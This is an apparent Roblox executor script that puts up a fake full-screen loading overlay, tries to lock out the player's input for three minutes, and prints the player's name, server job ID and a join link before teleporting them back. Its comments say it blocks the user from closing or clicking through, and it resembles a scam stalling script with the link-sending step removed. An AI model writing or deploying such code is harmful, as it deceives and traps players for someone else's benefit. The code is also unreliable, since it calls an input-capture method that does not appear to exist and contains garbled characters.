local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TeleportService = game:GetService("TeleportService")

local lp = Players.LocalPlayer

-- Create full screen loading GUI that blocks input
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.ResetOnSpawn = false
loadingGui.IgnoreGuiInset = true
loadingGui.Parent = CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Active = true
frame.Selectable = true
frame.Parent = loadingGui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 0, 50)
label.Position = UDim2.new(0, 0, 0.5, -25)
label.BackgroundTransparency = 1
label.Text = "ðŸ”„ Loading, please wait..."
label.TextColor3 = Color3.new(1, 1, 1)
label.Font = Enum.Font.GothamBold
label.TextSize = 30
label.Parent = frame

-- Block all input so they canâ€™t close or click through
frame.InputBegan:Connect(function(input)
    input:CaptureControl()
end)
frame.InputChanged:Connect(function(input)
    input:CaptureControl()
end)
for _, guiElement in pairs(loadingGui:GetDescendants()) do
    if guiElement:IsA("GuiObject") then
        guiElement.InputBegan:Connect(function(input)
            input:CaptureControl()
        end)
        guiElement.InputChanged:Connect(function(input)
            input:CaptureControl()
        end)
    end
end

-- Prepare teleport info (no HTTP sending)
local placeId = game.PlaceId
local jobId = game.JobId
local joinLink = string.format(
    "https://www.roblox.com/games/start?placeId=%d&gameId=%s",
    placeId,
    jobId
)

print("Teleport Info:")
print("Player:", lp.Name)
print("PlaceId:", placeId)
print("JobId:", jobId)
print("Join Link:", joinLink)
print("Time:", os.date("%Y-%m-%d %H:%M:%S"))

wait(180) -- 3 minutes loading time

loadingGui:Destroy()

-- Teleport player to same server instance
TeleportService:TeleportToPlaceInstance(placeId, jobId)
